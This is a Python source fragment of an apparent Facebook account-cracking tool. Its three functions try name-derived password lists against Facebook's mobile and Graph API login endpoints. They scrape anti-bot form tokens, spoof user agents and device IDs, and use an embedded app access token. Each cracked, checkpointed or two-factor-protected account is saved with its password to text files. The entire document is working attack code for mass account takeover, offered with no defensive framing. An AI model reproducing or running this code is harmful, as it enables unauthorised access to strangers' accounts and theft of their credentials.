def method3(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m m3','\033[1;31m m3']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write('\r %s   %s[%s/%s]  OK:- %s  CP:- %s  2F:- %s\r'%(rr,whi,loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            session = requests.Session()
            url = 'https://mbasic.facebook.com/?ref=opera_speed_dial_freefb'
            raw = session.get(url).text
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),"li":re.search('name="li" value="(.*?)"', str(raw)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
            header = ({'authority':'https://mbasic.facebook.com',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'*;q=0.1',
            'accept-language':'en-PK,en;q=0.9',
            'cache-control':'private, no-cache, no-store, must-revalidate',
            'upgrade-insecure-requests':'1',
            'user-agent':random.choice(ua_opera),
            'connection':'keep-alive'})
            post_request = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8&amp;ref=opera_speed_dial_freefb',data=payload,headers=header).text
            cookies = session.cookies.get_dict().keys()
            #open('jhuk.html', 'w').write(post_request)
            if 'c_user' in cookies:
                print('\033[1;32m [AXI-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d.group(1)):
                    print('\033[1;35m [AXI-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\033[1;31m [AXI-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
def method4(ids,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m m2','\033[1;31m m2']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write('\r %s   %s[%s/%s]  OK:- %s  CP:- %s  2F:- %s\r'%(rr,whi,loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            r = requests.Session()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            post = r.post("https://graph.facebook.com/auth/login",data=data)
            q = json.loads(post.text)
            if 'access_token' in q:
                print('\033[1;32m [AXI-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m [AXI-2F] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m [AXI-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def random_method(ids,passlist,total_ids):
    global ua,loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m O_O','\033[1;31m -_-']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write('\r %s%s %s/%s OK:- %s  CP:- %s  2F:- %s\r'%(rr,whi,loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            header = ({'authority':'https://m.facebook.com',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'*;q=0.1',
            'accept-language':'en-PK,en;q=0.9',
            'cache-control':'private, no-cache, no-store, must-revalidate',
            'upgrade-insecure-requests':'1',
            'user-agent':random.choice(op_and),'connection':'keep-alive'})
            url = 'https://m.facebook.com/?ref=opera_speed_dial_freefb'
            raw = xyz.get(url).text
            koki = (";").join([ "%s=%s" % (key, value) for key, value in xyz.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2; wd=412x756'
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(raw)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In",
            "_fb_noscript":"true"
            }
            post_request = xyz.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8&amp;ref=opera_speed_dial_freefb',data=payload,headers=header,cookies={'cookie':koki}).text
            #open('iii.html', 'w').write(post_request)
            cookies = xyz.cookies.get_dict().keys()
            if 'c_user' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[7:22]
                if cid in ok:
                    pass
                else:
                    print('\033[1;92m [AXI-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('ok.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    pass
                else:
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;95m [AXI-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;94m [AXI-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('cp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
        loop+=1
    except Exception as e:
        pass

main()
